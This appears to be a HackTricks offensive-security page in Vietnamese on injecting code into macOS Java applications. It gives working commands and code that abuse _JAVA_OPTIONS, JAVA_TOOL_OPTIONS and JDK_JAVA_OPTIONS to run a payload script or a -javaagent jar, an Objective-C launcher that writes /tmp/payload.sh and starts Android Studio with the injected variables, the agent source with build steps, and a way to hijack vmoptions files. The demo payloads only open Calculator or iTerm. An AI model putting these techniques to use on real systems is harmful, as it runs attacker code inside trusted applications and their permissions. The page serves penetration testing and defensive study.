# Injection vào ứng dụng Java trên macOS

{{#include ../../../banners/hacktricks-training.md}}

## Liệt kê

Tìm các ứng dụng Java đã cài đặt trên hệ thống. Có thể thấy rằng **Info.plist** của các ứng dụng Java sẽ chứa một số tham số Java có chuỗi **`java.`**, vì vậy bạn có thể tìm kiếm chuỗi này:

```bash
# Search only in /Applications folder
sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null

# Full search
sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
```

## \_JAVA_OPTIONS

Biến môi trường **`_JAVA_OPTIONS`** có thể được dùng để chèn các tham số Java VM tùy ý khi một ứng dụng Java khởi chạy.<sup>[[1]](#references)</sup>

Ngăn xếp khởi chạy Java cũng nhận diện hai biến được định nghĩa rõ hơn với phạm vi khác nhau:

- `JAVA_TOOL_OPTIONS` được đọc khi VM được tạo, kể cả một số đường dẫn khởi chạy nhúng không đi qua trình khởi chạy `java`. Biến này có thể chèn các tùy chọn instrumentation như `-javaagent`, `-agentlib` hoặc `-agentpath`.<sup>[[4]](#references)</sup>
- `JDK_JAVA_OPTIONS` được trình khởi chạy `java` thêm vào trước dòng lệnh. Các tùy chọn dùng để chọn lớp chính hoặc kết thúc trình khởi chạy bị cấm, nhưng `-javaagent` được chấp nhận.<sup>[[5]](#references)</sup>

Cả ba biến này nên được xem là các cơ chế kiểm soát thực thi mã JVM khi kẻ tấn công cũng có thể cung cấp một agent tương thích và có thể đọc được. `_JAVA_OPTIONS` là chi tiết triển khai của HotSpot, vì vậy hãy xác thực biến này theo đúng nhà cung cấp và phiên bản; `JAVA_TOOL_OPTIONS` hoặc `JDK_JAVA_OPTIONS` phù hợp hơn cho việc kiểm thử đa nền tảng.

```bash
# Write your payload in a script called /tmp/payload.sh
export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
```

Để thực thi nó dưới dạng một tiến trình mới, thay vì tiến trình con của terminal hiện tại, bạn có thể dùng:

```objectivec
#import <Foundation/Foundation.h>
// clang -fobjc-arc -framework Foundation invoker.m -o invoker

int main(int argc, const char * argv[]) {
    @autoreleasepool {
        // Specify the file path and content
        NSString *filePath = @"/tmp/payload.sh";
        NSString *content = @"#!/bin/bash\n/Applications/iTerm.app/Contents/MacOS/iTerm2";

        NSError *error = nil;

        // Write content to the file
        BOOL success = [content writeToFile:filePath
                                 atomically:YES
                                   encoding:NSUTF8StringEncoding
                                      error:&error];

        if (!success) {
            NSLog(@"Error writing file at %@\n%@", filePath, [error localizedDescription]);
            return 1;
        }

        NSLog(@"File written successfully to %@", filePath);

        // Create a new task
        NSTask *task = [[NSTask alloc] init];

        /// Set the task's launch path to use the 'open' command
        [task setLaunchPath:@"/usr/bin/open"];

        // Arguments for the 'open' command, specifying the path to Android Studio
        [task setArguments:@[@"/Applications/Android Studio.app"]];

        // Define custom environment variables
        NSDictionary *customEnvironment = @{
            @"_JAVA_OPTIONS": @"-Xms2m -Xmx5m -XX:OnOutOfMemoryError=/tmp/payload.sh"
        };

        // Get the current environment and merge it with custom variables
        NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary:[[NSProcessInfo processInfo] environment]];
        [environment addEntriesFromDictionary:customEnvironment];

        // Set the task's environment
        [task setEnvironment:environment];

        // Launch the task
        [task launch];
    }
    return 0;
}
```

Tuy nhiên, kỹ thuật đó gây ra lỗi trong ứng dụng đang chạy. Một giải pháp kín đáo hơn là tạo Java agent và sử dụng `-javaagent`:<sup>[[2]](#references)</sup>

```bash
export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"

# The same agent with the standardized VM initialization variable:
JAVA_TOOL_OPTIONS='-javaagent:/tmp/Agent.jar' java -jar /path/to/application.jar

# Or through the JDK java launcher:
JDK_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar' java -jar /path/to/application.jar
```

> [!CAUTION]
> Tạo agent bằng **phiên bản Java khác** với phiên bản của ứng dụng có thể khiến cả agent lẫn ứng dụng gặp sự cố.

Agent có thể nằm ở:

```java:Agent.java
import java.io.*;
import java.lang.instrument.*;

public class Agent {
  public static void premain(String args, Instrumentation inst) {
    try {
      String[] commands = new String[] { "/usr/bin/open", "-a", "Calculator" };
      Runtime.getRuntime().exec(commands);
    }
    catch (Exception err) {
      err.printStackTrace();
    }
  }
}
```

Để biên dịch agent, hãy chạy:

```bash
javac Agent.java # Create Agent.class
jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
```

Với `manifest.txt`:

```
Premain-Class: Agent
Agent-Class: Agent
Can-Redefine-Classes: true
Can-Retransform-Classes: true
```

Sau đó export biến môi trường và chạy ứng dụng Java như sau:

```bash
export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```

## tệp vmoptions

Tệp này hỗ trợ chỉ định **các tham số Java** khi Java được thực thi. Bạn có thể sử dụng một số kỹ thuật trước đó để thay đổi các tham số Java và **khiến tiến trình thực thi các lệnh tùy ý**.\
Ngoài ra, tệp này cũng có thể **bao gồm các tệp khác** bằng chỉ thị `include`, vì vậy bạn cũng có thể thay đổi một tệp được bao gồm.

Hơn nữa, một số ứng dụng Java sẽ **tải nhiều tệp `vmoptions`**.

Một số ứng dụng, chẳng hạn như Android Studio, cho biết trong **đầu ra vị trí chúng tìm kiếm** các tệp này:<sup>[[3]](#references)</sup>

```bash
/Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions

2023-12-13 19:53:23.920 studio[74913:581359] fullFileName is: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] fullFileName exists: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.921 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app.vmoptions
2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
```

Nếu không, bạn có thể kiểm tra điều đó bằng:

```bash
# Monitor
sudo eslogger lookup | grep vmoption # Give FDA to the Terminal

# Launch the Java app
/Applications/Android\ Studio.app/Contents/MacOS/studio
```

Lưu ý rằng Android Studio trong ví dụ này cố tải **`/Applications/Android Studio.app.vmoptions`**, một vị trí mà bất kỳ người dùng nào trong nhóm **`admin` đều có quyền ghi**.

## References

- [1] [OpenJDK — Phân tích cú pháp `_JAVA_OPTIONS` trong `arguments.cpp`](https://cr.openjdk.org/~never/bsd_headers/src/share/vm/runtime/arguments.cpp.html)
- [2] [Oracle Java — Đặc tả gói `java.lang.instrument`](https://docs.oracle.com/javase/8/docs/api/java/lang/instrument/package-summary.html)
- [3] [JetBrains — Cấu hình tùy chọn JVM và thuộc tính nền tảng](https://intellij-support.jetbrains.com/hc/en-us/articles/206544869-Configuring-JVM-options-and-platform-properties)
- [4] [Oracle Java — `JAVA_TOOL_OPTIONS`](https://docs.oracle.com/javase/8/docs/technotes/guides/troubleshoot/envvars002.html)
- [5] [Trình khởi chạy `java` — `JDK_JAVA_OPTIONS`](https://docs.oracle.com/en/java/javase/25/docs/specs/man/java.html#using-the-jdk_java_options-launcher-environment-variable)
{{#include ../../../banners/hacktricks-training.md}}
